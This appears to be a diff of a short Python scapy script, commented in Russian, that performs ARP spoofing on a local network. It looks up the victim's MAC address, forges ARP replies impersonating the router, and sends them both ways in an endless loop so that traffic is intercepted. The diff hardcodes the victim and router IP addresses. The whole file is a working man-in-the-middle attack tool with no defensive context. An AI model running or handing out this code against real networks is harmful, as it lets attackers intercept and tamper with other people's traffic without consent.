@@ -2,6 +2,7 @@ import scapy.all as scapy
 
 import time
 
+
 def get_mac(ip):#Узнаем mac адрес
 
     arp_request = scapy.ARP(pdst = ip) #Создание ARP пакета с указанием широковещательного ip-адреса
@@ -15,21 +16,17 @@ def get_mac(ip):#Узнаем mac адрес
 
     return answered_list[0][1].hwsrc, print(answered_list[0][1].hwsrc)
 
-
 def spoof(target_ip, spoof_ip):#Собираем поддельный пакет и отправляем его
-
     target_mac = get_mac(target_ip) #(input('Введите ip адрес жертвы для получения mac: '))
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+    scapy.send(packet)#Отправка поддельного пакета
 
-    pacet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # op - выбор режима отправки ответа, pdst - ip жертвы, hwdst - mac жертвы, psrc - поддельный ip маршрутизатора
-
-    scapy.send(pacet)#Отправка поддельного пакета
-
-target = '192.168.31.140' #input('Введите ip адрес жертвы (пример: X.X.X.X): ')
+target = '192.168.31.157' #input('Введите ip адрес жертвы (пример: X.X.X.X): ')
 router = '192.168.31.1' #input('Введите ip адрес маршрутизатора(роутера) (пример: X.X.X.X): ')
 
 #Зацикливание отправки поддельных пакетов (если этого не делать, то при втором запросе жертвы ARP таблица вернется в прежнее состояние)
 
 while 1:
-    spoof(target, router)
-    spoof(router, target)
+    spoof('192.168.31.157', '192.168.31.1')
+    spoof('192.168.31.1', '192.168.31.157')
     time.sleep(2)#Задержка отправки пакетов 
